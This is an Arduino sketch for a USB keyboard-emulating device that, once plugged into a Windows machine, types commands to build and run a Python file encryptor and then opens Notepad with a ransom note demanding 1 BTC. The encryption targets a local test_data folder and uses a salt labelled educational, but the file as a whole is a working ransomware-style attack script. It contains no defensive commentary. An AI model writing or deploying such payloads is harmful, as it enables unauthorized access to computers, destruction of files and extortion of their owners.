#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

String Key = "12345678";

void typeLine(const char *line, int wait = 1) {
  Keyboard.print(line);
  Keyboard.write(KEY_RETURN);
  delay(wait);
}

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(500); // Let OS detect USB device

  // Open CMD
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(50);
  typeLine("cmd", 200);
  typeLine("cd %userprofile%\\Desktop", 5);

  // Create Python script via echo
  int d = 1;
  typeLine("echo import os > encryptor.py", d);
  typeLine("echo import base64 >> encryptor.py", d);
  typeLine("echo import getpass >> encryptor.py", d);
  typeLine("echo from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC >> encryptor.py", d);
  typeLine("echo from cryptography.fernet import Fernet >> encryptor.py", d);
  typeLine("echo from cryptography.hazmat.primitives import hashes >> encryptor.py", d);
  typeLine("echo from cryptography.hazmat.backends import default_backend >> encryptor.py", d);
  typeLine("echo. >> encryptor.py", d);

  typeLine("echo def derive_key(password, salt): >> encryptor.py", d);
  typeLine("echo     kdf = PBKDF2HMAC( >> encryptor.py", d);
  typeLine("echo         algorithm=hashes.SHA256(), >> encryptor.py", d);
  typeLine("echo         length=32, >> encryptor.py", d);
  typeLine("echo         salt=salt, >> encryptor.py", d);
  typeLine("echo         iterations=390000, >> encryptor.py", d);
  typeLine("echo         backend=default_backend() >> encryptor.py", d);
  typeLine("echo     ) >> encryptor.py", d);
  typeLine("echo     return base64.urlsafe_b64encode(kdf.derive(password.encode())) >> encryptor.py", d);
  typeLine("echo. >> encryptor.py", d);

  typeLine("echo def encrypt_folder(folder, fernet): >> encryptor.py", d);
  typeLine("echo     for root, _, files in os.walk(folder): >> encryptor.py", d);
  typeLine("echo         for file in files: >> encryptor.py", d);
  typeLine("echo             if file.endswith('.txt') or file.endswith('.log'): >> encryptor.py", d);
  typeLine("echo                 path = os.path.join(root, file) >> encryptor.py", d);
  typeLine("echo                 with open(path, 'rb') as f: >> encryptor.py", d);
  typeLine("echo                     data = f.read() >> encryptor.py", d);
  typeLine("echo                 with open(path, 'wb') as f: >> encryptor.py", d);
  typeLine("echo                     f.write(fernet.encrypt(data)) >> encryptor.py", d);
  typeLine("echo                 print(f'[+] Encrypted: {path}') >> encryptor.py", d);
  typeLine("echo. >> encryptor.py", d);

  typeLine("echo def decrypt_folder(folder, fernet): >> encryptor.py", d);
  typeLine("echo     for root, _, files in os.walk(folder): >> encryptor.py", d);
  typeLine("echo         for file in files: >> encryptor.py", d);
  typeLine("echo             if file.endswith('.txt') or file.endswith('.log'): >> encryptor.py", d);
  typeLine("echo                 path = os.path.join(root, file) >> encryptor.py", d);
  typeLine("echo                 with open(path, 'rb') as f: >> encryptor.py", d);
  typeLine("echo                     data = f.read() >> encryptor.py", d);
  typeLine("echo                 try: >> encryptor.py", d);
  typeLine("echo                     decrypted = fernet.decrypt(data) >> encryptor.py", d);
  typeLine("echo                     with open(path, 'wb') as f: >> encryptor.py", d);
  typeLine("echo                         f.write(decrypted) >> encryptor.py", d);
  typeLine("echo                     print(f'[-] Decrypted: {path}') >> encryptor.py", d);
  typeLine("echo                 except: >> encryptor.py", d);
  typeLine("echo                     print(f'[!] Failed to decrypt: {path}') >> encryptor.py", d);
  typeLine("echo. >> encryptor.py", d);

  typeLine("echo if __name__ == '__main__': >> encryptor.py", d);
  typeLine("echo     folder = './test_data' >> encryptor.py", d);
  typeLine("echo     os.makedirs(folder, exist_ok=True) >> encryptor.py", d);
  typeLine("echo     password = getpass.getpass('Enter password: ') >> encryptor.py", d);
  typeLine("echo     salt = b'educational_demo_salt!' >> encryptor.py", d);
  typeLine("echo     key = derive_key(password, salt) >> encryptor.py", d);
  typeLine("echo     fernet = Fernet(key) >> encryptor.py", d);
  typeLine("echo     mode = input('Mode (e=encrypt, d=decrypt): ').strip().lower() >> encryptor.py", d);
  typeLine("echo     if mode == 'e': >> encryptor.py", d);
  typeLine("echo         encrypt_folder(folder, fernet) >> encryptor.py", d);
  typeLine("echo     elif mode == 'd': >> encryptor.py", d);
  typeLine("echo         decrypt_folder(folder, fernet) >> encryptor.py", d);
  typeLine("echo     else: >> encryptor.py", d);
  typeLine("echo         print('[!] Invalid mode.') >> encryptor.py", d);

  // Run the script
  typeLine("python encryptor.py", d);
  typeLine(Key, d); // password aka "key"
  typeLine("e", d);
  typeLine("exit", d);  // ⬅️ This closes CMD
  delay(100);

  // Open notepad
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(50);
  typeLine("notepad", 200);
  typeLine("Congratulations, all your files have been encrypted.", d);
  typeLine("To decrypt it, you must pay to our group 1 BTC.", d);

}

void loop() {
  // Nothing
}
